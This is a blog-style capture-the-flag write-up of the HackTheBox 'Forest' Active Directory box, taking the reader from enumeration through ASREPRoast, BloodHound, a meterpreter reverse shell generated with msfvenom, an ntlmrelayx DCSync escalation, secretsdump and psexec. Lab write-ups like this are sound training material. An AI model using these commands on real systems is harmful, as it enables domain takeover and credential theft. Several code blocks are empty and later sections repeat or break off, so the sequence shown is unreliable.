This box was incredibly difficult for me because I had little to no experience in pentesting with Active Directory environments but it was definitely an eye-opening experience!

# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

{% highlight bash %}
$ echo "10.10.10.161 forest.htb" >> /etc/hosts
{% endhighlight %}

# Reconnaissance

Using `nmap`, we are able to determine the open ports and running services on the machine.
{% highlight bash %}
$ nmap -sV -sT -sC forest.htb

# Enumeration (1)

Seems like an Active Directory Domain Controller. Where do we start ? @.@ 

According to the `nmap`'s host script results, we see the actual domain name of the box is `htb.local` so lets modify `/etc/hosts` to include it as well.

{% highlight bash %}
$ cat /etc/hosts
...
10.10.10.161 forest.htb htb.local
{% endhighlight %}

Seeing that there might be a `DNS` server running on port 53, lets try to use `dig` on it.

{% highlight bash %}
$ dig axfr htb.local @10.10.10.161

; <<>> DiG 9.11.5-P4-5.1-Debian <<>> axfr htb.local @10.10.10.161
;; global options: +cmd
; Transfer failed.
{% endhighlight %}

Nothing :( `LDAP` is running on port `389` so lets check that out using `ldapsearch`.

{% highlight bash %}
$ ldapsearch -h htb.local -p 389 -x -b "dc=htb,dc=local" 
# extended LDIF
#
# LDAPv3
# base <dc=htb,dc=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# htb.local
dn: DC=htb,DC=local
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=htb,DC=local
...
{% endhighlight %}

I'm not sure what to look for but let's first look at what users we can find? I wasn't familiar with how `LDAP` queries work so I decided to use another tool [`windapsearch`](https://github.com/ropnop/windapsearch) to simplify the job.

[*] Bye!

Nice! We found 5 usernames to play with! But what exactly can we do with them?

Seeing that there is `Kerberos` running on port `88`, we know that we probably need to get our hands dirty with Kerberos attacks. After reading this [article](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/), lets see if we can perform the `ASREPRoast` attack using `impacket`'s [`GetNPUsers.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) while specifying the 5 usernames we found.

{% highlight bash %}

{% endhighlight %}

Looks like we didn't manage to get any hashes... 

At this point, I wasn't sure how to carry on so I check the forums for hints. Many of them actually stated that they were able to obtain a hash but instead of finding 5 usernames, they found 6? How was I missing a username? 

Inside of `impacket`'s collection of scripts, there was a file called [`GetADUsers.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetADUsers.py) which seemed hopeful.

There it is! The 6th username is `svc-alfresco`. But I wonder why did the username not appear in our `LDAP` search results just now?

After appending the username to the list of usernames, we performed the `ASREPRoast` attack again.

# Enumeration (2)

This was where I really got lost and I had to turn to the forums for more hints.

Many mentioned about some "dog" but I guess they were referring to [`BloodHound`](https://github.com/BloodHoundAD/BloodHound). 

{% highlight raw%}
BloodHound is a single page Javascript web application, built on top of Linkurious, compiled with Electron, with a Neo4j database fed by a PowerShell/C# ingestor.

BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attacks can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. Defenders can use BloodHound to identify and eliminate those same attack paths. Both blue and red teams can use BloodHound to easily gain a deeper understanding of privilege relationships in an Active Directory environment.
{% endhighlight %}

When I first read the description, I was pretty amazed as I had yet to see any applications of graph theory in cyber security and I did a bit of graph theory in my data structures and algorithms class. To get the PowerShell ingestor ([`SharpHound`](https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.exe)) to run on the system, I first need to upgrade my current `WinRM` shell to a `meterpreter` shell.

First, I generate my reverse shell executable using `msfvenom` and start our reverse shell listener.
{% highlight bash %}
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.XX.XX LPORT=1337 -f exe > shell.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload

Final size of exe file: 73802 bytes

$ msfconsole
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.10.XX.XX

LPORT => 1337
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.XX.XX:1337
{% endhighlight %}

And then start a web server using the builtin `SimpleHTTPServer` module in `python`
{% highlight bash %}
$ mkdir httpserver
$ cd httpserver
$ cp ~/shell.exe .
$ python -m SimpleHTTPServer 80

And now the moment you have been waiting for, witness the capabilities of `BloodHound`! 
There are actually 2 ways to run `BloodHound`, first being running it on your own system and secondly being running it in a `Docker` container. Since it is extremely troublesome to set up, I will be using this image [`belane/bloodhound`](https://github.com/belane/docker-bloodhound).

{% highlight bash %}
$ docker run -it \
-p 7474:7474 \
-e DISPLAY=unix$DISPLAY \
-v /tmp/.X11-unix:/tmp/.X11-unix \
--device=/dev/dri:/dev/dri \
--name bloodhound belane/bloodhound
{% endhighlight %}

What you will notice is that a window will automatically be opened and `BloodHound` is instantly ready to be used. Currently, it is not displaying anything as we had yet to upload our data yet. `BloodHound` actually supports drag and drop but for some reason it was not working so we need to use `docker cp` to get the data in.

{% highlight bash %}
$ docker cp 20191116084214_BloodHound.zip bloodhound:/20191116084214_BloodHound.zip
{% endhighlight %}

Then from the interface, click on `Upload Data` on the right side, select the file and hit `Open`. It will take a while for `BloodHound` to populate its database.

I won't go through all the features of `BloodHound`, but I will be focusing on one of them which is the ability to perform pathfinding from a given Start Node to a given Target Node. These nodes can be Users, Groups or OUs. Since we are currently `svc-alfresco` and are attempting to escalate to the `Administrator` account, we will set `svc-alfresco@htb.local` as the Start Node and `Administrator@htb.local` as the Target Node and hope that we are able to find a path. Click on the triangle button to begin pathfinding.

![](/assets/images/forest2.png)

As you can see, there is indeed a path for us to escalate our privileges. The main focus will be on the edge between `EXCHANGE WINDOWS PERMISSION@HTB.LOCAL` and HTB.LOCAL. If you right-click on the edge and click on Help, more information of the `WriteDacl` privilege will be given.

{% highlight raw %}
The members of the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL have permissions to modify the DACL (Discretionary Access Control List) on the domain HTB.LOCAL. With write access to the target object's DACL, you can grant yourself any privilege you want on the object.
{% endhighlight %}

According to this [post](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/), the `WriteDacl` privilege allows us to perform `DCSync` operations, which somehow allows us to retrieve hashed passwords from the Active Directory. Hence, we will need to add a user to the `EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL`.

# Exploitation

First we will need to upload [`PowerView`](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1), which is a module that I use that contains many useful `Powershell` commands for offensive operations.

{% highlight raw %}
meterpreter > upload /root/Downloads/PowerView.ps1 .
[*] uploading  : /root/Downloads/PowerView.ps1 -> .
[*] uploaded   : /root/Downloads/PowerView.ps1 -> .\PowerView.ps1
{% endhighlight %}

Back to the powershell shell, we will import it in.
{% highlight powershell %}
Import-Module .\PowerView.ps1
{% endhighlight %}

Next we will create a new user and add him to the `EXCHANGE WINDOWS PERMISSIONS` group.
{% highlight powershell %}
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
New-DomainUser -SamAccountName rizemon -AccountPassword $UserPassword
Add-DomainGroupMember -Identity "Exchange Windows Permissions" -Members 'rizemon'
{% endhighlight %}

![](/assets/images/forest3.png)

According to this picture from the earlier post, we will need to run `ntlmrelayx` on our machine.
{% highlight bash %}
$ ntlmrelayx.py -t ldap://htb.local --escalate-user rizemon

{% endhighlight %}

With that done, we need to get the `Exchange` Server to perform `NTLM` authentication to us over `HTTP`. However, there is no `Exchange` server running on the box! Since we already have a user in the `EXCHANGE WINDOWS PERMISSIONS` group, we can simply use our own browser to do the authentication.

Opening any browser, we browse to `http://localhost/privexchange`. We will then be prompted for credentials, where we enter those of our newly created user and hit `OK`.

Back on our `ntlmrelayx`, we see that our new user has gotten the necessary privileges to perform `DCSync` operations!

{% highlight bash %}

{% endhighlight %}

And now the last step is to obtain the hash for the domain administrator account using `impacket`'s [`secretsdump.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py).

{% highlight bash %}
$ python secretsdump.py 'htb.local/rizemon:Password123!@htb.local' -just-dc

Using `impacket`'s [`psexec.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) and the hashes we got, we can remotely login to the box as Administrator.

{% highlight bash %}

First we will need to upload [`PowerView`](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1), which contains the commands needed for our exploit. 

{% highlight raw %}

{% endhighlight %}

With that done, we will need to login as the newly created user. To do so, we will need to allow the user to be remotely managed by adding him to the `Remote Management Users` group.
{% highlight powershell %}
Add-DomainGroupMember -Identity "Remote Management Users" -Members 'rizemon'
{% endhighlight %}

We then establish a shell using `Alamot`'s [`winrm_shell.rb`](https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb) and upgrade to a `meterpreter` shell.

{% highlight ruby %}
require 'winrm'

We are going to need [`PowerView`](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) again as well as [`mimikatz`](https://github.com/gentilkiwi/mimikatz/releases), which is used to dump out the password hashes.

{% highlight raw %}

{% endhighlight %}

To dump out the hashes, the new user will need the `DCSync` privileges, which consist of the `DS-Replication-Get-Changes`,  `DS-Replication-Get-Changes-All` and `Replicating Directory Changes In Filtered Set` rights. More can be learnt from [here](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync). Fortunately, we can use the `Add-DomainObjectAcl` function to add all 3 privilges for us using the `-Rights DCSync` option.
